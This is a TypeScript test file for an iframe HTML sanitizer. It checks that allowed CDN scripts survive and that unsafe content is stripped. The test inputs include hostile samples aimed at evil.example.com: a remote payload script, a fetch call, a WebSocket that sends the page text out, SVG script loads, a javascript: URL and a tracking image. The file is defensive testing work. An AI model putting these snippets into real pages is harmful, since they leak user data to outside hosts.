import { describe, expect, it } from "bun:test";
import { sanitizeIframeHtml } from "@/lib/iframeSecurity";

describe("sanitizeIframeHtml", () => {
  it("keeps allowed Tailwind and Chart.js scripts", () => {
    const html = `
      <!doctype html>
      <html>
        <head>
          <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
          <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
        </head>
        <body>
          <canvas id="chart"></canvas>
          <script>
            const ctx = document.getElementById("chart");
            new Chart(ctx, { type: "line", data: { labels: ["A"], datasets: [{ data: [1] }] } });
          </script>
        </body>
      </html>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).toContain("@tailwindcss/browser@4");
    expect(sanitized).toContain("chart.umd.min.js");
    expect(sanitized).toContain("new Chart(");
    expect(sanitized).toContain("Content-Security-Policy");
    expect(sanitized).toContain("connect-src 'none'");
    expect(sanitized).toContain("img-src https://images.unsplash.com https://plus.unsplash.com data: blob:");
  });

  it("removes disallowed and unsafe scripts", () => {
    const html = `
      <script src="https://evil.example.com/payload.js"></script>
      <script>fetch("https://evil.example.com");</script>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("evil.example.com");
    expect(sanitized).not.toContain("fetch(");
  });

  it("removes an SVG script that loads from href, and keeps inline code that sets href", () => {
    const html = `
      <svg><script href="https://cdn.jsdelivr.net/npm/evil/x.js"></script></svg>
      <svg><script xlink:href="https://evil.example.com/x.js"></script></svg>
      <script>document.querySelector("a").href = "#top";</script>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("npm/evil");
    expect(sanitized).not.toContain("evil.example.com");
    expect(sanitized).toContain('.href = "#top"');
  });

  it("removes scripts with websocket-style exfiltration patterns", () => {
    const html = `
      <script>
        const ws = new WebSocket("wss://evil.example.com");
        ws.onopen = () => ws.send(document.body.innerText);
      </script>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("WebSocket");
    expect(sanitized).not.toContain("evil.example.com");
  });

  it("removes disallowed tags, handlers, and javascript: URLs", () => {
    const html = `
      <form action="/x"><input type="text" /></form>
      <a href="javascript:alert(1)" onclick="alert(1)">Click</a>
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).not.toContain("<form");
    expect(sanitized).not.toContain("<input");
    expect(sanitized).not.toContain("onclick=");
    expect(sanitized).toContain('href="#"');
  });

  it("keeps project images and allows the app origin for them in a browser", () => {
    const html = '<img src="/api/assets/3f2b8c1e-9a4d-4e6f-8b2a-1c3d5e7f9a0b"><img src="/api/other">';
    expect(sanitizeIframeHtml(html)).toContain("/api/assets/3f2b8c1e-9a4d-4e6f-8b2a-1c3d5e7f9a0b");
    expect(sanitizeIframeHtml(html)).not.toContain("/api/other");

    const globals = globalThis as { location?: { origin: string } };
    globals.location = { origin: "https://wirely.site" };
    try {
      expect(sanitizeIframeHtml(html)).toMatch(/img-src [^;]*https:\/\/wirely\.site/);
    } finally {
      delete globals.location;
    }
  });

  it("removes image tags from disallowed hosts", () => {
    const html = `
      <img src="https://images.unsplash.com/photo-1" alt="ok" />
      <img src="https://evil.example.com/tracker.png" alt="bad" />
    `;

    const sanitized = sanitizeIframeHtml(html);
    expect(sanitized).toContain("images.unsplash.com");
    expect(sanitized).not.toContain("evil.example.com");
  });
});
